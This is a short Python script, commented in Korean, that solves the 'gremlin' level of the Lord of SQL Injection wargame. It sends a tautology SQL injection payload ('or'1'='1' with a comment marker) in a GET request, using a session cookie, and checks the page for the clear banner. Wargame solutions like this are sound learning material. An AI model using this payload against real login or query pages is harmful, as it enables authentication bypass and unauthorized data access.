# -*- coding : UTF-8 -*-
from requests import get

#Lord of SQL Injection GREMLIN문제로 URL을 설정합니다.
url = "http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php"

#쿠키를 설정합니다. 당신의 쿠키로 설정해야 합니다.
cookie = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")

#파라미터를 저장합니다. PHP에서 $_SERVER['QUERY_STRING']에 해당되는 부분입니다.
param = "?id='or'1'='1'%23"

#requests 모듈을 이용해 HTTP GET으로 연결합니다.
r = get(url + param , cookies=cookie)

if r.text.find("<h2>GREMLIN Clear!</h2>") > 0:
    print("축하합니다! Gremlin 단계를 클리어했습니다!")
